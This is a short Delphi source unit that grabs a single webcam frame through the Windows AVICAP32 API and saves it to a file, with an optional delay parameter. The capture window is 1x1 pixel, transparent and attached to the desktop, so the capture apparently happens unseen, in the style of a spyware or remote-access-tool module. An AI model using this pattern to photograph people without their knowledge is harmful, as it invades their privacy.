unit untWebcam;

interface

uses
Windows;

Procedure WebcamPic(Name: String);
Procedure advcam(pwrate,gecikme:integer;Name: String);

implementation

const
  WM_USER             = $0400;
  WM_CLOSE            = $0010;
  WM_CAP_START                  = WM_USER;
  WM_CAP_DRIVER_CONNECT         = WM_CAP_START+10;
  WM_CAP_DRIVER_DISCONNECT      = WM_CAP_START+11;
  WM_CAP_SAVEDIB                = WM_CAP_START+25;
  WM_CAP_SET_PREVIEW            = WM_CAP_START+50;
  WM_CAP_SET_PREVIEWRATE        = WM_CAP_START+52;
  WM_CAP_SET_SCALE              = WM_CAP_START+53;
  WM_CAP_GRAB_FRAME             = WM_CAP_START+60;

Var
  OutputFile    :String;
  VideoHwnd     :HWND;

Function capCreateCaptureWindowA(lpszWindowName: PChar; dwStyle: LongInt; x: Integer;
                                 y: Integer; nWidth: Integer; nHeight: Integer;
                                 ParentWin: HWND; nID: Integer): HWND; STDCALL EXTERNAL 'AVICAP32.DLL';


Procedure advcam(pwrate,gecikme:integer;Name: String);
Var
DeskHandle    :THandle;
Begin
DeskHandle := FindWindowExA(0, 0, 'Progman', NIL);
Try
VideoHWND := capCreateCaptureWindowA('Video', WS_CHILD OR WS_EX_TRANSPARENT, 0, 0, 1, 1, DeskHandle, 0);
If (SendMessage(VideoHwnd, WM_CAP_DRIVER_CONNECT, 0, 0) <> 0) Then Begin
SendMessage(VideoHwnd, WM_CAP_SET_PREVIEW, -1, 0);
SendMessage(VideoHwnd, WM_CAP_SET_PREVIEWRATE, pwrate, 0);
SendMessage(VideoHwnd, WM_CAP_SET_SCALE, -1, 0);
End;
finally
    // Error
End;
OutputFile := Name;

sleep(gecikme);

If (SendMessage(VideoHwnd, WM_CAP_GRAB_FRAME, 0, 0) <> 0) And (SendMessage(VideoHwnd, WM_CAP_SAVEDIB, wParam(0), lParam(pChar(OutputFile))) <> 0) Then SendMessage(VideoHwnd, WM_CAP_SET_PREVIEW, -1, 0);

  If (VideoHwnd <> 0) Then
  Begin
    SendMessage(VideoHwnd, WM_CAP_DRIVER_DISCONNECT, 0, 0);
    SetParent(VideoHwnd, 0);
    SendMessage(VideoHwnd, WM_CLOSE, 0, 0);
  End;
End;

Procedure WebcamPic(Name: String);
Var
  DeskHandle    :THandle;
Begin
  DeskHandle := FindWindowExA(0, 0, 'Progman', NIL);
  Try
    VideoHWND := capCreateCaptureWindowA('Video', WS_CHILD or WS_EX_TRANSPARENT, 0, 0, 1, 1, DeskHandle, 0);
    If (SendMessage(VideoHwnd, WM_CAP_DRIVER_CONNECT, 0, 0) <> 0) Then
    Begin
      SendMessage(VideoHwnd, WM_CAP_SET_PREVIEW, -1, 0);
      SendMessage(VideoHwnd, WM_CAP_SET_PREVIEWRATE, 100, 0);
      SendMessage(VideoHwnd, WM_CAP_SET_SCALE, -1, 0);
    End;
  finally
    // Error
  End;
  OutputFile := Name;

  If (SendMessage(VideoHwnd, WM_CAP_GRAB_FRAME, 0, 0) <> 0) And
     (SendMessage(VideoHwnd, WM_CAP_SAVEDIB, wParam(0), lParam(pChar(OutputFile))) <> 0) Then
       SendMessage(VideoHwnd, WM_CAP_SET_PREVIEW, -1, 0);

  If (VideoHwnd <> 0) Then
  Begin
    SendMessage(VideoHwnd, WM_CAP_DRIVER_DISCONNECT, 0, 0);
    SetParent(VideoHwnd, 0);
    SendMessage(VideoHwnd, WM_CLOSE, 0, 0);
  End;
End;

end.
